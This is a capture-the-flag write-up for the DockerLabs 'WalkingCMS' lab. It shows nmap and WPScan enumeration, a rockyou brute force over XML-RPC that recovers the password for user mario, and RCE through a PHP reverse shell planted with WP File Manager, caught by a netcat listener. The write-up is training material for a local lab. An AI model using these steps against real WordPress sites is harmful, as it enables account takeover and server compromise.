![](adjuntos/Pasted%20image%2020260217054052.png)
# WalkingCMS – DockerLabs

> Practical exploitation of a misconfigured WordPress deployment resulting in authenticated administrative access and Remote Code Execution (RCE) within a containerized environment.

---

## 1️⃣ Lab Information

- **Platform:** [DockerLabs](https://dockerlabs.es)
- **Environment Type:** Docker-based containerized environment
- **Target Service:** WordPress 6.4.3 running on Apache 2.4.57 (Debian)
- **Exploited Vulnerability:** Weak credential policy combined with abuse of administrative privileges enabling arbitrary PHP code execution (RCE)
- **Difficulty:** Medium

### Skills Demonstrated

- Network enumeration (Nmap)
- Web application reconnaissance and attack surface analysis
- WordPress user enumeration (WPScan)
- Controlled credential brute-force via XML-RPC
- Authenticated Remote Code Execution (RCE)
- Reverse shell establishment and post-exploitation validation

## 🐳 2️⃣ Deployment

The target machine was deployed as a Docker container using the provided deployment script:
```bash
sudo bash auto_deploy.sh walkingcms.tar
[+] Image loaded successfully 
[+] Container started 
[+] Assigned IP: 172.17.0.2
```

The container was successfully instantiated and assigned the internal Docker network address `172.17.0.2`.

## 🔎 3️⃣ Enumeration

Comprehensive TCP port scan and service detection were performed using Nmap:
```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache 2.4.57 (Debian)
```
## 4️⃣ Service Analysis

Port **80/tcp** exposes an Apache 2.4.57 (Debian) web server.

Initial access:
```bash
http://172.17.0.2
```

The default Apache landing page was observed.

During manual enumeration, an active subdirectory was identified:
```bash
http://172.17.0.2/wordpress
```

The presence of a WordPress 6.4.3 instance was confirmed.

📌 A high-impact service was identified. Exploitation efforts were prioritized at the web application layer due to the exposed CMS attack surface and authentication mechanisms.

## 5️⃣ Identification and Attack Preparation

### 5.1 User Enumeration

Automated CMS enumeration was performed using WPScan:

`wpscan --url http://172.17.0.2/wordpress -e u`

Relevant output:
```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://172.17.0.2/wordpress/ [172.17.0.2]
[+] Started: Tue Feb 17 06:30:40 2026

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.57 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://172.17.0.2/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://172.17.0.2/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://172.17.0.2/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://172.17.0.2/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.9.1 identified (Latest, released on 2026-02-03).
 | Found By: Rss Generator (Passive Detection)
 |  - http://172.17.0.2/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=6.9.1</generator>
 |  - http://172.17.0.2/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.9.1</generator>

[+] WordPress theme in use: twentytwentytwo
 | Location: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/
 | Last Updated: 2025-12-03T00:00:00.000Z
 | Readme: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/readme.txt
 | [!] The version is out of date, the latest version is 2.1
 | Style URL: http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/style.css?ver=1.6
 | Style Name: Twenty Twenty-Two
 | Style URI: https://wordpress.org/themes/twentytwentytwo/
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.6 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/style.css?ver=1.6, Match: 'Version: 1.6'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <==================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] mario
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://172.17.0.2/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Feb 17 06:30:42 2026
[+] Requests Done: 53
[+] Cached Requests: 6
[+] Data Sent: 14.14 KB
[+] Data Received: 332.674 KB
[+] Memory used: 179.184 MB
[+] Elapsed time: 00:00:01
```

The existence of the user **`mario`** was successfully confirmed.

From a security assessment perspective, the exposure of XML-RPC combined with a valid username significantly increases the likelihood of a successful authentication attack, particularly in the absence of rate limiting or account lockout controls.

### 5.2 Brute-Force Attack

Wordlist decompression (if required):
```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

Targeted password attack execution:
```bash
wpscan --url http://172.17.0.2/wordpress -U mario -P /usr/share/wordlists/rockyou.txt
```

Valid administrative credentials were successfully identified.
```bash
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://172.17.0.2/wordpress/ [172.17.0.2]
[+] Started: Tue Feb 17 06:31:57 2026

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - mario / love                                                                                                                        
Trying mario / dakota Time: 00:00:17 <  > (390 / 14344782)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: mario, Password: love
```
📌 Authenticated access to the WordPress administrative panel was successfully obtained.

From a security standpoint, this confirms the presence of weak credential controls combined with exposed XML-RPC authentication, resulting in full administrative compromise of the CMS.

## 6️⃣ Exploitation

Access to the WordPress administrative panel:
```bash
http://172.17.0.2/wordpress/wp-admin
```

After successful authentication using the compromised credentials, a plugin enabling direct interaction with the server filesystem was installed.

Plugin installation path:

`Plugins → Add New → WP File Manager`

Once inside, modify an existing PHP file and insert reverse shell code to achieve remote code execution (RCE).

We will use the **Pentestmonkey's PHP reverse shell** code and set up a listener.

![](adjuntos/Pasted%20image%2020260219014417.png)
### Listener Preparation on Attacker Machine

Prior to triggering the malicious PHP file, a listener was configured to receive the inbound connection:
```bash
sudo nc -lvnp 443
```

Expected output:
```bash
Listening on 0.0.0.0 443
```

The listener must remain active before invoking the modified PHP file through the browser.
The altered PHP file was then executed via direct browser access, triggering the reverse shell connection.

## 7️⃣ Access Validation

Connection received on the attacker machine:
```bash
sudo nc -lvnp 443

[sudo] contraseña para lolo:
Listening on 0.0.0.0 443
Connection received on 172.17.0.2 53112
Linux 08e7c09799a6 6.12.32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.32-1parrot1 (2025-06-27) x86_64 GNU/Linux
 04:23:47 up  2:58,  0 user,  load average: 1.29, 0.80, 0.68
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can't access tty; job control turned off
$
```

Validation:
```bash
whoami
```

Output:
```bash
www-data
```

An interactive shell was successfully established under the web service account.

## 🔐 Privilege Validation

```bash
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Command execution was confirmed under the `www-data` user context, validating successful Remote Code Execution within the containerized environment.